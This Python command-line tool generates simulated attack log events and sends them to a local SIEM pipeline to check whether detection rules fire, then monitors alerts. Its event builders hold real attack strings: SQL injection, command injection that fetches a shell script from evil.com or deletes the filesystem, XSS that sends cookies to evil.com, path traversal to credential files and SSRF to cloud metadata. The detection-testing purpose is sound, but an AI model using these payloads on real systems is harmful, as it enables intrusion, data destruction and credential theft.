#!/usr/bin/env python3
"""
SIEM Attack Toolkit — генератор атак + мониторинг детекции в реалтайме.

Режимы:
  siem-attack.py attack <тип>  — отправить атаку
  siem-attack.py watch         — мониторинг событий и алертов
  siem-attack.py scan          — атака + мониторинг одновременно
  siem-attack.py list          — список доступных атак

Usage:
  python siem-attack.py attack brute_force
  python siem-attack.py attack all
  python siem-attack.py watch
  python siem-attack.py scan xss
"""

from __future__ import annotations

import json
import os
import sys
import time
import uuid
from datetime import datetime, timezone
from typing import Any

import click
import httpx

# ── Defaults ────────────────────────────────────────────────────────────────────

VECTOR_URL = os.getenv("VECTOR_URL", "http://localhost:8080/logs")
PARSER_URL = os.getenv("PARSER_URL", "http://localhost:7000")
CORRELATOR_URL = os.getenv("CORRELATOR_URL", "http://localhost:9111")
ALERTMANAGER_URL = os.getenv("ALERTMANAGER_URL", "http://localhost:9093")
CLICKHOUSE_URL = os.getenv(
    "CLICKHOUSE_URL", "http://localhost:8123"
)
CLICKHOUSE_USER = os.getenv("CLICKHOUSE_USER", "siem")
CLICKHOUSE_PASS = os.getenv("CLICKHOUSE_PASSWORD", "ClickHousePass123!")

ATTACKER_IPS = [
    "203.0.113.99",
    "203.0.113.5",
    "203.0.113.12",
    "203.0.113.88",
    "198.51.100.20",
    "198.51.100.55",
]

NORMAL_IPS = [
    "192.168.1.10",
    "192.168.1.22",
    "192.168.1.33",
]

# ── Event builders ──────────────────────────────────────────────────────────────


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


def _dotnet_event(
    *,
    message: str,
    level: str = "Warning",
    client_ip: str = "192.168.1.10",
    method: str = "GET",
    path: str = "/api/orders",
    status: int = 200,
    duration_ms: float = 42.0,
    user_id: str | None = None,
    extra: dict[str, Any] | None = None,
) -> dict:
    props: dict[str, Any] = {
        "ClientIp": client_ip,
        "RequestMethod": method,
        "RequestPath": path,
        "StatusCode": status,
        "Elapsed": duration_ms,
    }
    if user_id:
        props["UserId"] = user_id
    if extra:
        props.update(extra)
    return {
        "Timestamp": _ts(),
        "Level": level,
        "Message": message,
        "SourceType": "dotnet",
        "Host": "api-01",
        "Properties": props,
    }


def _nginx_event(
    *,
    message: str,
    client_ip: str = "192.168.1.10",
    method: str = "GET",
    path: str = "/",
    status: int = 200,
    duration_ms: float = 10.0,
    extra: dict[str, Any] | None = None,
) -> dict:
    props: dict[str, Any] = {
        "ClientIp": client_ip,
        "RequestMethod": method,
        "RequestPath": path,
        "StatusCode": status,
        "Elapsed": duration_ms,
    }
    if extra:
        props.update(extra)
    return {
        "Timestamp": _ts(),
        "Level": "Information",
        "Message": message,
        "SourceType": "nginx",
        "Host": "web-01",
        "Properties": props,
    }


# ── Attack generators ───────────────────────────────────────────────────────────

ATTACKS: dict[str, dict[str, Any]] = {}


def _register(
    name: str, description: str, rule_id: str, severity: str, mitre: list[str]
):
    def decorator(fn):
        ATTACKS[name] = {
            "fn": fn,
            "description": description,
            "rule_id": rule_id,
            "severity": severity,
            "mitre": mitre,
        }
        return fn

    return decorator


@_register(
    "brute_force",
    "Brute-force: 15 failed logins from one IP",
    "brute_force_api",
    "high",
    ["T1110", "T1110.001"],
)
def attack_brute_force() -> list[dict]:
    ip = ATTACKER_IPS[0]
    events = []
    for i in range(15):
        events.append(
            _dotnet_event(
                message=f"HTTP POST /api/auth/login responded 401 in {20 + i}.0ms",
                level="Error",
                client_ip=ip,
                method="POST",
                path="/api/auth/login",
                status=401,
                duration_ms=20.0 + i,
                user_id=f"user-{i % 3}",
            )
        )
    return events


@_register(
    "sql_injection",
    "SQL injection: UNION SELECT, DROP TABLE, NoSQL $where",
    "sql_injection_attempt",
    "high",
    ["T1190", "T1059.007"],
)
def attack_sql_injection() -> list[dict]:
    payloads = [
        ("' OR '1'='1", "/api/users/search?q="),
        ("UNION SELECT null,username,password FROM users--", "/api/products?sort="),
        ("; DROP TABLE users;--", "/api/admin/cleanup?cmd="),
        ('$where: "this.password == \'admin\'"', "/api/auth/token"),
        ("0x414141414141", "/api/data/export?format="),
    ]
    events = []
    for i, (payload, path) in enumerate(payloads):
        events.append(
            _dotnet_event(
                message=f"Query failed: {payload}",
                level="Error",
                client_ip=ATTACKER_IPS[i % len(ATTACKER_IPS)],
                method="POST",
                path=path + payload[:30],
                status=500,
                duration_ms=150.0 + i * 10,
            )
        )
    return events


@_register(
    "command_injection",
    "Command injection: ; rm -rf, $(cat /etc/passwd), backdoor",
    "command_injection",
    "high",
    ["T1190", "T1059"],
)
def attack_command_injection() -> list[dict]:
    payloads = [
        ("; cat /etc/passwd", "/api/search?q="),
        ("$(wget http://evil.com/shell.sh)", "/api/tools/run?cmd="),
        ("| bash -c 'id'", "/api/exec?input="),
        ("; rm -rf /", "/api/admin/cleanup?dir="),
        ("`curl http://c2.server/beacon`", "/api/webhook?url="),
    ]
    events = []
    for i, (payload, path) in enumerate(payloads):
        events.append(
            _dotnet_event(
                message=f"Request processed: {payload}",
                level="Warning",
                client_ip=ATTACKER_IPS[i % len(ATTACKER_IPS)],
                method="POST",
                path=path + payload[:20],
                status=200,
                duration_ms=30.0,
            )
        )
    return events


@_register(
    "xss",
    "XSS: <script>, onerror, javascript: URI",
    "xss_attempt",
    "high",
    ["T1189", "T1059.007"],
)
def attack_xss() -> list[dict]:
    payloads = [
        ("<script>alert('xss')</script>", "/api/comments"),
        ('<img src=x onerror=alert(1)>', "/api/profile/bio"),
        ("javascript:document.cookie", "/api/redirect?url="),
        ("<svg onload=fetch('http://evil.com/'+document.cookie)>", "/api/upload/name"),
        ("%3Cscript%3Ealert(1)%3C/script%3E", "/api/search?q="),
    ]
    events = []
    for i, (payload, path) in enumerate(payloads):
        events.append(
            _dotnet_event(
                message=f"Input received: {payload[:60]}",
                level="Warning",
                client_ip=ATTACKER_IPS[i % len(ATTACKER_IPS)],
                method="POST",
                path=path,
                status=200,
                duration_ms=25.0,
            )
        )
    return events


@_register(
    "path_traversal",
    "Path traversal: ../../etc/passwd, encoded variants",
    "path_traversal",
    "high",
    ["T1083", "T1190"],
)
def attack_path_traversal() -> list[dict]:
    payloads = [
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2fetc/shadow",
        "....//....//etc/hosts",
        "/proc/self/environ",
    ]
    events = []
    for i, payload in enumerate(payloads):
        events.append(
            _dotnet_event(
                message=f"File access: {payload}",
                level="Warning",
                client_ip=ATTACKER_IPS[i % len(ATTACKER_IPS)],
                method="GET",
                path=f"/api/files?path={payload}",
                status=200 if i == 0 else 403,
                duration_ms=5.0,
            )
        )
    return events


@_register(
    "ssrf",
    "SSRF: internal IPs, metadata endpoints, localhost",
    "ssrf_attempt",
    "high",
    ["T1190"],
)
def attack_ssrf() -> list[dict]:
    targets = [
        ("http://10.0.0.1/admin", "/api/fetch?url=http://10.0.0.1/admin"),
        (
            "http://169.254.169.254/latest/meta-data/",
            "/api/proxy?dest=http://169.254.169.254/latest/meta-data/",
        ),
        ("http://127.0.0.1:8080/debug", "/api/render?url=http://127.0.0.1:8080/debug"),
        ("http://0.0.0.0/actuator/env", "/api/webhook?target=http://0.0.0.0/actuator/env"),
    ]
    events = []
    for i, (desc, path) in enumerate(targets):
        events.append(
            _dotnet_event(
                message=f"Fetch request: {desc}",
                level="Warning",
                client_ip=ATTACKER_IPS[i % len(ATTACKER_IPS)],
                method="POST",
                path=path,
                status=200,
                duration_ms=50.0,
                extra={"TargetUrl": desc},
            )
        )
    return events


@_register(
    "privilege_escalation",
    "Privilege escalation: 403 on admin + role bypass",
    "privilege_escalation_attempt",
    "high",
    ["T1068", "T1078.003"],
)
def attack_privilege_escalation() -> list[dict]:
    events = []
    ip = ATTACKER_IPS[4]
    # 403 on admin paths
    for path in ["/api/admin/users", "/api/internal/config", "/api/permissions/grant"]:
        for _ in range(3):
            events.append(
                _dotnet_event(
                    message=f"Access denied to {path}",
                    level="Error",
                    client_ip=ip,
                    method="GET",
                    path=path,
                    status=403,
                    duration_ms=10.0,
                )
            )
    # Role bypass
    events.append(
        _dotnet_event(
            message="Admin panel accessed",
            level="Warning",
            client_ip=ip,
            method="GET",
            path="/api/admin/dashboard",
            status=200,
            duration_ms=30.0,
            user_id="user-analyst",
            extra={"UserRole": "analyst"},
        )
    )
    return events


@_register(
    "rate_limit",
    "Rate limit evasion: 600 requests in 60s from one IP",
    "rate_limit_evasion",
    "medium",
    ["T1595", "T1595.002"],
)
def attack_rate_limit() -> list[dict]:
    ip = ATTACKER_IPS[5]
    events = []
    for i in range(600):
        events.append(
            _dotnet_event(
                message=f"HTTP GET /api/products/{i} responded 200 in 5.0ms",
                level="Information",
                client_ip=ip,
                method="GET",
                path=f"/api/products/{i}",
                status=200,
                duration_ms=5.0,
            )
        )
    return events


@_register(
    "error_spike",
    "Error spike: 25 server errors on one endpoint from one IP",
    "error_spike",
    "high",
    ["T1190"],
)
def attack_error_spike() -> list[dict]:
    ip = ATTACKER_IPS[2]
    events = []
    for i in range(25):
        events.append(
            _dotnet_event(
                message=f"Unhandled exception on /api/orders: NullReferenceException",
                level="Error",
                client_ip=ip,
                method="POST",
                path="/api/orders",
                status=500,
                duration_ms=200.0 + i,
            )
        )
    return events


@_register(
    "credential_stuffing",
    "Credential stuffing: 6 different IPs, same user, failed login",
    "credential_stuffing",
    "high",
    ["T1110.004"],
)
def attack_credential_stuffing() -> list[dict]:
    events = []
    user = "admin@company.com"
    for i, ip in enumerate(ATTACKER_IPS[:6]):
        events.append(
            _dotnet_event(
                message=f"HTTP POST /api/auth/login responded 401 in 35.0ms",
                level="Error",
                client_ip=ip,
                method="POST",
                path="/api/auth/login",
                status=401,
                duration_ms=35.0,
                user_id=user,
            )
        )
    return events


@_register(
    "unusual_http_methods",
    "Unusual HTTP methods: DELETE/PUT on sensitive endpoints",
    "unusual_http_methods",
    "medium",
    ["T1190"],
)
def attack_unusual_http_methods() -> list[dict]:
    events = []
    scenarios = [
        ("DELETE", "/api/admin/users/5", 200),
        ("PUT", "/api/config/settings", 200),
        ("PATCH", "/api/permissions/role", 200),
        ("DELETE", "/api/secrets/api-key", 403),
    ]
    for i, (method, path, status) in enumerate(scenarios):
        events.append(
            _dotnet_event(
                message=f"HTTP {method} {path} responded {status}",
                level="Warning" if status == 200 else "Error",
                client_ip=ATTACKER_IPS[i % len(ATTACKER_IPS)],
                method=method,
                path=path,
                status=status,
                duration_ms=20.0,
                user_id="attacker",
            )
        )
    return events


@_register(
    "data_exfiltration",
    "Data exfiltration: large response volume from one IP",
    "data_exfiltration",
    "high",
    ["T1048", "T1041"],
)
def attack_data_exfiltration() -> list[dict]:
    ip = ATTACKER_IPS[3]
    events = []
    for i in range(100):
        events.append(
            _dotnet_event(
                message=f"HTTP GET /api/reports/export responded 200 in 5200.0ms",
                level="Information",
                client_ip=ip,
                method="GET",
                path="/api/reports/export",
                status=200,
                duration_ms=5200.0,
                user_id="user-suspicious",
                extra={"ResponseSize": 5_000_000 + i * 100_000},
            )
        )
    return events


# ── Sender ──────────────────────────────────────────────────────────────────────


def send_events(events: list[dict], vector_url: str = VECTOR_URL) -> tuple[int, int]:
    """Send events as NDJSON to Vector. Returns (sent, failed)."""
    ndjson = "\n".join(json.dumps(e) for e in events)
    sent = 0
    failed = 0
    # Send in batches of 50
    batch_size = 50
    for i in range(0, len(events), batch_size):
        batch = events[i : i + batch_size]
        payload = "\n".join(json.dumps(e) for e in batch)
        try:
            resp = httpx.post(
                vector_url,
                content=payload,
                headers={"Content-Type": "application/x-ndjson"},
                timeout=15.0,
            )
            if resp.status_code < 300:
                sent += len(batch)
            else:
                failed += len(batch)
                click.echo(f"  [!] Vector returned {resp.status_code}", err=True)
        except httpx.ConnectError:
            failed += len(batch)
            click.echo(f"  [!] Cannot connect to Vector at {vector_url}", err=True)
            break
        except httpx.TimeoutException:
            failed += len(batch)
            click.echo("  [!] Timeout sending to Vector", err=True)
            break
    return sent, failed


# ── Monitoring ──────────────────────────────────────────────────────────────────


def check_service(name: str, url: str, path: str = "/health") -> bool:
    try:
        resp = httpx.get(f"{url}{path}", timeout=5.0)
        return resp.status_code < 300
    except (httpx.ConnectError, httpx.TimeoutException):
        return False


def fetch_correlator_stats(correlator_url: str = CORRELATOR_URL) -> dict | None:
    try:
        resp = httpx.get(f"{correlator_url}/api/v1/stats", timeout=5.0)
        if resp.status_code == 200:
            return resp.json()
    except (httpx.ConnectError, httpx.TimeoutException):
        pass
    return None


def fetch_correlator_rules(correlator_url: str = CORRELATOR_URL) -> list | None:
    try:
        resp = httpx.get(f"{correlator_url}/api/v1/rules", timeout=5.0)
        if resp.status_code == 200:
            return resp.json()
    except (httpx.ConnectError, httpx.TimeoutException):
        pass
    return None


def fetch_alertmanager_alerts(alertmanager_url: str = ALERTMANAGER_URL) -> list | None:
    try:
        resp = httpx.get(
            f"{alertmanager_url}/api/v2/alerts",
            headers={"Accept": "application/json"},
            timeout=5.0,
        )
        if resp.status_code == 200:
            return resp.json()
    except (httpx.ConnectError, httpx.TimeoutException):
        pass
    return None


def fetch_recent_events(
    seconds: int = 30,
    clickhouse_url: str = CLICKHOUSE_URL,
    clickhouse_user: str = CLICKHOUSE_USER,
    clickhouse_pass: str = CLICKHOUSE_PASS,
) -> list[dict] | None:
    try:
        query = (
            f"SELECT event_id, source_type, source_ip, url_path, status_code, "
            f"http_method, severity, message, timestamp "
            f"FROM siem.events "
            f"WHERE timestamp >= now() - INTERVAL {seconds} SECOND "
            f"ORDER BY timestamp DESC LIMIT 20 "
            f"FORMAT JSON"
        )
        resp = httpx.post(
            clickhouse_url,
            content=query,
            auth=(clickhouse_user, clickhouse_pass),
            timeout=10.0,
        )
        if resp.status_code == 200:
            data = resp.json()
            return data.get("data", [])
    except (httpx.ConnectError, httpx.TimeoutException):
        pass
    return None


def format_alert_summary(alerts: list) -> str:
    if not alerts:
        return "  (no active alerts)"
    lines = []
    for a in alerts[:10]:
        labels = a.get("labels", {})
        annotations = a.get("annotations", {})
        rule_id = labels.get("rule_id", "?")
        severity = labels.get("severity", "?")
        source_ip = labels.get("source_ip", "?")
        desc = annotations.get("description", "")[:80]
        lines.append(f"  [{severity.upper():8s}] {rule_id:30s} ip={source_ip:16s} {desc}")
    return "\n".join(lines)


# ── CLI ─────────────────────────────────────────────────────────────────────────


@click.group()
@click.option("--vector-url", default=VECTOR_URL, help="Vector HTTP ingest URL")
@click.option("--correlator-url", default=CORRELATOR_URL, help="Correlator URL")
@click.option("--alertmanager-url", default=ALERTMANAGER_URL, help="Alertmanager URL")
@click.option("--clickhouse-url", default=CLICKHOUSE_URL, help="ClickHouse URL")
@click.pass_context
def cli(ctx, vector_url, correlator_url, alertmanager_url, clickhouse_url):
    """SIEM Attack Toolkit - attack generator and detection monitor."""
    ctx.ensure_object(dict)
    ctx.obj["vector_url"] = vector_url
    ctx.obj["correlator_url"] = correlator_url
    ctx.obj["alertmanager_url"] = alertmanager_url
    ctx.obj["clickhouse_url"] = clickhouse_url


@cli.command("list")
def list_attacks():
    """Show available attack types."""
    click.echo("\n  Available attack types:\n")
    click.echo(f"  {'Name':<25s} {'Rule ID':<30s} {'Severity':<10s} Description")
    click.echo(f"  {'-' * 25:<25s} {'-' * 30:<30s} {'-' * 10:<10s} {'-' * 40}")
    for name, info in ATTACKS.items():
        click.echo(
            f"  {name:<25s} {info['rule_id']:<30s} {info['severity']:<10s} {info['description']}"
        )
    click.echo(f"\n  Use 'all' to run all attacks sequentially.\n")


@cli.command("attack")
@click.argument("attack_type")
@click.option("--count", default=1, help="Number of times to repeat the attack")
@click.option("--delay", default=2.0, help="Delay between attacks (seconds)")
@click.option("--dry-run", is_flag=True, help="Print events without sending")
@click.pass_context
def attack_cmd(ctx, attack_type, count, delay, dry_run):
    """Send attack of the specified type."""
    vector_url = ctx.obj["vector_url"]

    if attack_type == "all":
        attack_names = list(ATTACKS.keys())
    elif attack_type in ATTACKS:
        attack_names = [attack_type]
    else:
        click.echo(f"  [!] Unknown attack type: {attack_type}")
        click.echo(f"  Use 'list' to see available types.")
        sys.exit(1)

    for name in attack_names:
        info = ATTACKS[name]
        for run in range(count):
            click.echo(f"\n  -- Attack: {name} (rule: {info['rule_id']}) --")
            click.echo(f"  MITRE: {', '.join(info['mitre'])}")
            click.echo(f"  Expected severity: {info['severity']}")

            events = info["fn"]()
            click.echo(f"  Generated {len(events)} events")

            if dry_run:
                click.echo(f"  [DRY RUN] Events:")
                for ev in events[:3]:
                    msg = ev.get("Message", "")[:80]
                    path = ev.get("Properties", {}).get("RequestPath", "")
                    status = ev.get("Properties", {}).get("StatusCode", "")
                    click.echo(f"    {msg}  path={path}  status={status}")
                if len(events) > 3:
                    click.echo(f"    ... and {len(events) - 3} more")
            else:
                sent, failed = send_events(events, vector_url)
                click.echo(f"  Sent: {sent}, Failed: {failed}")
                if sent > 0:
                    click.echo(f"  Waiting {delay}s for detection pipeline...")
                    time.sleep(delay)

            if run < count - 1:
                time.sleep(delay)

    if not dry_run:
        click.echo(f"\n  Check alerts: python siem-attack.py watch")


@cli.command("watch")
@click.option("--interval", default=3, help="Poll interval in seconds")
@click.option("--clickhouse/--no-clickhouse", default=True, help="Poll ClickHouse for events")
@click.pass_context
def watch_cmd(ctx, interval, clickhouse):
    """Monitor events and alerts in real time."""
    urls = ctx.obj
    try:
        from rich.console import Console
        from rich.live import Live
        from rich.panel import Panel
        from rich.table import Table
        from rich.text import Text

        use_rich = True
    except ImportError:
        use_rich = False

    if use_rich:
        _watch_rich(interval, clickhouse, urls)
    else:
        _watch_plain(interval, clickhouse, urls)


def _watch_rich(interval: int, use_clickhouse: bool, urls: dict):
    from rich.console import Console
    from rich.live import Live
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    console = Console()
    seen_alert_keys: set[str] = set()
    vector_url = urls.get("vector_url", VECTOR_URL)
    correlator_url = urls.get("correlator_url", CORRELATOR_URL)
    alertmanager_url = urls.get("alertmanager_url", ALERTMANAGER_URL)
    clickhouse_url = urls.get("clickhouse_url", CLICKHOUSE_URL)

    with Live(console=console, refresh_per_second=1) as live:
        while True:
            now = datetime.now(timezone.utc).strftime("%H:%M:%S")

            # Service status
            services_table = Table(title="Service Status", show_header=False, box=None)
            services_table.add_column("Service", style="bold")
            services_table.add_column("Status")

            checks = [
                ("Vector", vector_url, "/health"),
                ("Parser", PARSER_URL, "/health"),
                ("Correlator", correlator_url, "/health"),
                ("Alertmanager", alertmanager_url, "/-/healthy"),
            ]
            for name, url, path in checks:
                ok = check_service(name, url, path)
                status = "[green]OK[/green]" if ok else "[red]DOWN[/red]"
                services_table.add_row(name, status)

            # Correlator stats
            stats = fetch_correlator_stats(correlator_url)
            stats_text = ""
            if stats:
                stats_text = (
                    f"Rules: {stats.get('rules_count', '?')}  "
                    f"Pending alerts: {stats.get('pending_alerts', '?')}  "
                    f"Capacity: {stats.get('alert_capacity', '?')}"
                )

            # Active alerts
            alerts = fetch_alertmanager_alerts(alertmanager_url)
            new_alerts = []
            if alerts:
                for a in alerts:
                    labels = a.get("labels", {})
                    key = f"{labels.get('rule_id', '')}:{labels.get('source_ip', '')}"
                    if key not in seen_alert_keys:
                        seen_alert_keys.add(key)
                        new_alerts.append(a)

            alerts_table = Table(title="Active Alerts", show_header=True, box=None)
            alerts_table.add_column("Severity", style="bold")
            alerts_table.add_column("Rule ID")
            alerts_table.add_column("Source IP")
            alerts_table.add_column("Description", max_width=60)

            if alerts:
                for a in alerts[:15]:
                    labels = a.get("labels", {})
                    annotations = a.get("annotations", {})
                    severity = labels.get("severity", "?")
                    sev_style = {"critical": "red", "high": "yellow", "medium": "cyan"}.get(
                        severity, "white"
                    )
                    alerts_table.add_row(
                        f"[{sev_style}]{severity.upper()}[/{sev_style}]",
                        labels.get("rule_id", "?"),
                        labels.get("source_ip", "?"),
                        annotations.get("description", "")[:60],
                    )
            else:
                alerts_table.add_row("(none)", "", "", "")

            # Recent events from ClickHouse
            events_panel = None
            if use_clickhouse:
                events = fetch_recent_events(seconds=30, clickhouse_url=clickhouse_url)
                if events:
                    events_table = Table(
                        title="Recent Events (last 30s)", show_header=True, box=None
                    )
                    events_table.add_column("Time", width=8)
                    events_table.add_column("IP", width=16)
                    events_table.add_column("Method", width=6)
                    events_table.add_column("Path", max_width=30)
                    events_table.add_column("Status", width=3)
                    events_table.add_column("Severity", width=8)

                    for ev in events[:10]:
                        ts = ev.get("timestamp", "")[11:19] if ev.get("timestamp") else ""
                        events_table.add_row(
                            ts,
                            ev.get("source_ip", ""),
                            ev.get("http_method", ""),
                            (ev.get("url_path", "") or "")[:30],
                            str(ev.get("status_code", "")),
                            ev.get("severity", ""),
                        )
                    events_panel = Panel(events_table)
                else:
                    events_panel = Panel(
                        "[dim]ClickHouse unavailable or no recent events[/dim]",
                        title="Recent Events",
                    )

            # Compose layout
            layout_parts = [
                Panel(services_table, title=f"SIEM Watch [{now}]"),
                Panel(stats_text, title="Correlator"),
                Panel(alerts_table, title="Alerts"),
            ]
            if events_panel:
                layout_parts.append(events_panel)

            if new_alerts:
                layout_parts.append(
                    Panel(
                        f"[bold red]{len(new_alerts)} NEW ALERT(S) DETECTED[/bold red]",
                        title="!! Attention",
                    )
                )

            live.update(layout_parts)
            time.sleep(interval)


def _watch_plain(interval: int, use_clickhouse: bool, urls: dict):
    seen_alert_keys: set[str] = set()
    vector_url = urls.get("vector_url", VECTOR_URL)
    correlator_url = urls.get("correlator_url", CORRELATOR_URL)
    alertmanager_url = urls.get("alertmanager_url", ALERTMANAGER_URL)
    clickhouse_url = urls.get("clickhouse_url", CLICKHOUSE_URL)

    while True:
        now = datetime.now(timezone.utc).strftime("%H:%M:%S")
        click.echo(f"\n{'=' * 60}")
        click.echo(f"  SIEM Watch  [{now}]")
        click.echo(f"{'=' * 60}")

        # Services
        click.echo("\n  Services:")
        for name, url, path in [
            ("Vector", vector_url, "/health"),
            ("Parser", PARSER_URL, "/health"),
            ("Correlator", correlator_url, "/health"),
            ("Alertmanager", alertmanager_url, "/-/healthy"),
        ]:
            ok = check_service(name, url, path)
            click.echo(f"    {name:15s} {'OK' if ok else 'DOWN'}")

        # Stats
        stats = fetch_correlator_stats(correlator_url)
        if stats:
            click.echo(
                f"\n  Correlator: rules={stats.get('rules_count', '?')}  "
                f"pending={stats.get('pending_alerts', '?')}"
            )

        # Alerts
        alerts = fetch_alertmanager_alerts(alertmanager_url)
        new_count = 0
        if alerts:
            for a in alerts:
                labels = a.get("labels", {})
                key = f"{labels.get('rule_id', '')}:{labels.get('source_ip', '')}"
                if key not in seen_alert_keys:
                    seen_alert_keys.add(key)
                    new_count += 1
            click.echo(f"\n  Active alerts ({len(alerts)}):")
            click.echo(format_alert_summary(alerts))
        else:
            click.echo("\n  Active alerts: (none)")

        if new_count > 0:
            click.echo(f"\n  >>> {new_count} NEW ALERT(S) DETECTED <<<")

        # Events
        if use_clickhouse:
            events = fetch_recent_events(seconds=30, clickhouse_url=clickhouse_url)
            if events:
                click.echo(f"\n  Recent events ({len(events)}):")
                for ev in events[:10]:
                    ts = ev.get("timestamp", "")[11:19] if ev.get("timestamp") else ""
                    click.echo(
                        f"    {ts}  {ev.get('source_ip', ''):16s}  "
                        f"{ev.get('http_method', ''):6s}  "
                        f"{(ev.get('url_path', '') or '')[:35]:35s}  "
                        f"status={ev.get('status_code', '')}"
                    )
            else:
                click.echo("\n  Recent events: ClickHouse unavailable")

        time.sleep(interval)


@cli.command("scan")
@click.argument("attack_type")
@click.option("--delay", default=5.0, help="Seconds to wait before checking alerts")
@click.option("--timeout", default=60, help="Max seconds to wait for alert")
@click.pass_context
def scan_cmd(ctx, attack_type, delay, timeout):
    """Send attack and wait for detection (attack + monitor)."""
    vector_url = ctx.obj["vector_url"]
    alertmanager_url = ctx.obj["alertmanager_url"]

    if attack_type not in ATTACKS and attack_type != "all":
        click.echo(f"  [!] Unknown attack type: {attack_type}")
        sys.exit(1)

    attack_names = list(ATTACKS.keys()) if attack_type == "all" else [attack_type]

    for name in attack_names:
        info = ATTACKS[name]
        rule_id = info["rule_id"]

        click.echo(f"\n  == Attack: {name} ==")
        click.echo(f"  | Rule: {rule_id}")
        click.echo(f"  | MITRE: {', '.join(info['mitre'])}")
        click.echo(f"  | Severity: {info['severity']}")

        events = info["fn"]()
        click.echo(f"  | Events: {len(events)}")

        click.echo(f"  + Sending to Vector...")
        sent, failed = send_events(events, vector_url)
        click.echo(f"  Sent: {sent}, Failed: {failed}")

        if sent == 0:
            click.echo(f"  [SKIP] No events sent, skipping alert check")
            continue

        # Wait and poll for alert
        click.echo(f"  Waiting for detection (max {timeout}s)...")
        start = time.time()
        found = False

        while time.time() - start < timeout:
            time.sleep(min(delay, timeout - (time.time() - start)))
            alerts = fetch_alertmanager_alerts(alertmanager_url)
            if alerts:
                for a in alerts:
                    labels = a.get("labels", {})
                    if labels.get("rule_id") == rule_id:
                        severity = labels.get("severity", "?")
                        source_ip = labels.get("source_ip", "?")
                        annotations = a.get("annotations", {})
                        desc = annotations.get("description", "")[:80]
                        click.echo(f"\n  [+] ALERT DETECTED!")
                        click.echo(f"    Rule: {rule_id}")
                        click.echo(f"    Severity: {severity}")
                        click.echo(f"    Source IP: {source_ip}")
                        click.echo(f"    Description: {desc}")
                        found = True
                        break
            if found:
                break
            elapsed = int(time.time() - start)
            click.echo(f"  ... polling ({elapsed}s / {timeout}s)")

        if not found:
            click.echo(f"\n  [-] NO ALERT detected within {timeout}s")
            click.echo(f"    Check: docker logs siem-correlator")

    click.echo(f"\n  Done.")


if __name__ == "__main__":
    cli()
